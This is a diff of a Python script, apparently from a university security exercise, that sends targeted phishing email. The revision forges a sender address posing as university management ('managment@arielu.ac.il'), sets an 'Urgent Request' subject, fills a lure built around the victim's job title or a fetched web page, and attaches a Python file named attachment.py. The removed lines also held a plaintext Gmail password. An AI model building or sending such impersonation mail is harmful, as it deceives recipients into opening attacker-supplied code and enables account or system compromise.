@@ -6,25 +6,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-
-
-def send_mail(server, my_email, user_email, job_title, message):
-    msg = MIMEMultipart()
-    msg['From'] = my_email
-    msg['To'] = user_email
-    msg['Subject'] = f"Dear {job_title}"
-    msg.attach(MIMEText(message, 'plain'))
-    part = MIMEBase('application', "octet-stream")
-    part.set_payload(open("attachment.py", "rb").read())
-    encoders.encode_base64(part)
-
-    part.add_header('Content-Disposition', 'attachment; filename="attachment.py"')
-    msg.attach(part)
-
-    try:
-        server.sendmail(my_email, user_email, msg.as_string())
-    except:
-        print('failed')
+from urllib import request
 
 
 def fill_template(username, jobtitle):
@@ -41,7 +23,7 @@ def main():
     job_title = sys.argv[3]
 
     mail_body = ""
-    if len(sys.argv) == 4:
+    if len(sys.argv) == 5:
         if 'www' in sys.argv[4]:  # url
             try:
                 with urllib.request.urlopen(sys.argv[4]) as f:
@@ -62,17 +44,22 @@ def main():
     else:
         mail_body = fill_template(username, job_title)
 
-    user_email = username + "@" + mail_server
+    message = MIMEMultipart("alternative")
+    message["Subject"] = "Urgent Request"
+    message["From"] = "managment@arielu.ac.il"
+    message["To"] = username + "@" + mail_server
+    message.attach(MIMEText(mail_body, "plain"))
 
-    my_email = 'mymail@gmail.com'
-    password = 'Aa123456'
+    part = MIMEBase('application', "octet-stream")
+    part.set_payload(open("attachment.py", "rb").read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment; filename="attachment.py"')
+    message.attach(part)
 
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.ehlo()
-    server.login(my_email, password)
-    send_mail(server, my_email, user_email, job_title, mail_body)
-    server.quit()
+    hlp = message["To"]
+    with smtplib.SMTP('localhost') as s:
+        s.send_message(message)
+        print(f"done. sent to {hlp}")
 
 
 main()
